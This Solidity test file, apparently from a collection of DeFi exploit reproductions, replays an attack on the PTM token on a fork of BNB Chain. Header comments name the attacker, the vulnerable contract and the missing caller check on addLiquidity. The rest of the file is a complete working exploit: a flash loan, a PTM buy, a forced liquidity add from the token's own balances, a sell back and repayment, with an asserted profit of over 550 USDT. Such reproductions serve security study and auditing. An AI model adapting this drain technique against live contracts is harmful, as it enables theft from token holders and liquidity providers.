// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 552.63 USDT
// Attacker : 0x52e38d496f8d712394d5ed55e4d4cdd21f1957de
// Attack Contract : 0x9774d7bbf21f1c50881df62518c3160ab3a5a989
// Vulnerable Contract : 0x2e13771622b967e9afbf0dc6c7736c6b7544b0b7
// Attack Tx : {link: https://bscscan.com/tx/0x1bb9c2a30564ed685580f17890d5fa153edb3e86cc39fe6804cfb6dbfa0cae92}
//
// @Info
// Vulnerable Contract Code : {https://bscscan.com/address/0x2e13771622b967e9afbf0dc6c7736c6b7544b0b7#code}
//
// @Analysis
// Twitter Guy : {https://t.me/defimon_alerts/556}
//
// PTM exposed addLiquidity(uint256,uint256) publicly. The function spends the
// PTM token contract's own PTM and USDT balances through Pancake Router without
// checking the caller. The attacker flash-bought PTM, forced the token-owned
// balances into liquidity at the manipulated ratio, then sold PTM back for USDT.

address constant ATTACKER = 0x52e38D496F8D712394D5ED55E4d4Cdd21f1957De;
address constant ATTACK_CONTRACT = 0x9774d7bBf21f1c50881dF62518c3160ab3a5A989;
address constant PTM_TOKEN = 0x2E13771622b967e9aFBf0Dc6C7736C6b7544b0b7;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_V3_USDT_USDC_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
address constant PTM_USDT_PAIR = 0xfb0e91DeB4A8d6a4CeB46b877034F5908F5c48Bf;

interface IPTM is IERC20 {
    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_USDT_USDC_POOL);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPTM private constant ptm = IPTM(PTM_TOKEN);

    uint256 private constant FLASH_AMOUNT = 70_000 ether;

    function setUp() public {
        uint256 forkBlock = 47_224_908;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(PTM_TOKEN, "PTM");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(PANCAKE_V3_USDT_USDC_POOL, "Pancake V3 USDT/USDC Pool");
        vm.label(PTM_USDT_PAIR, "PTM/USDT Pair");
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = usdt.balanceOf(address(this));
        flashPool.flash(address(this), FLASH_AMOUNT, 0, "");
        assertGt(usdt.balanceOf(address(this)) - balanceBefore, 550 ether);
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == PANCAKE_V3_USDT_USDC_POOL, "pool only");

        usdt.approve(PANCAKE_ROUTER, type(uint256).max);
        ptm.approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = PTM_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_AMOUNT,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        uint256 contractPtm = ptm.balanceOf(PTM_TOKEN);
        uint256 contractUsdt = usdt.balanceOf(PTM_TOKEN);
        ptm.addLiquidity(contractPtm, contractUsdt);

        address[] memory sellPath = new address[](2);
        sellPath[0] = PTM_TOKEN;
        sellPath[1] = USDT_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ptm.balanceOf(address(this)),
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        usdt.transfer(PANCAKE_V3_USDT_USDC_POOL, FLASH_AMOUNT + fee0);
    }
}
